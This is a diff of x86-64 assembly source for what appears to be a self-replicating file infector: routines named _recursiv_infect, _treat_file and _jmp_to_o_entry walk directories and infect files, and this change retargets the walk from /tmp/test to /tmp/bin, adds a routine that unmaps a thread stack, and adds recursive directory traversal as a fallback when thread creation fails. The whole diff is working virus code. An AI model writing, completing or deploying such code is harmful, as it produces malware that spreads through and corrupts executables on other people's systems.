@@ -8,13 +8,14 @@
 ; }																			;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
+%define STACK_SIZE	(4096 * 1024)
 
 section .text
 	global _start
 	global _string
 	global _read_dir
 	global _ft_strlen
-	global _force_exit
+	global _munmap_thread
 	extern _treat_file
 	extern _final_end
 	extern _thread_create
@@ -53,7 +54,8 @@ _start:
 	mov rax, 0x0000000000000000
 	push rax
 	push rax
-	mov rax, 0x747365742f706d74 ; tmp/test
+;	mov rax, 0x747365742f706d74 ; tmp/test
+	mov rax, 0x006e69622f706d74 ; tmp/bin
 	push rax
 	mov rdi, rsp
 	mov rsi, rsp
@@ -78,6 +80,15 @@ _force_exit:
 	mov rax, 60 ; exit syscall number, will not be in final code
 	mov rdi, 0
 	syscall
+
+_munmap_thread:
+	mov rax, 11
+	mov rdi, rsp
+	add rdi, 16
+	sub rdi, STACK_SIZE
+	mov rsi, STACK_SIZE
+	syscall
+	jmp _force_exit
 
 _jmp_to_o_entry:
 	pop r15
@@ -292,7 +303,7 @@ _read_data:
 	jmp _continue
 
 _recursiv_infect:
-	mov rsi, [rsp + 296]
+	mov rsi, QWORD [rsp + 296]
 	add rsi, 19
 	cmp WORD [rsi], 0x002e
 	je _continue
@@ -312,6 +323,18 @@ _recursiv_infect:
 _lab_lol:
 ;	call _read_dir
 	call _thread_create
+	cmp rax, -1
+	jne _update_rsp
+	mov rdi, QWORD [rsp + 296]
+	add rdi, 19
+	mov rsi, rsp
+	add rsi, 8
+	push rdi
+	push rsi
+	call _read_dir
+	pop rdi
+	pop rdi
+_update_rsp:
 	add rsp, QWORD [rsp]
 
 _continue:
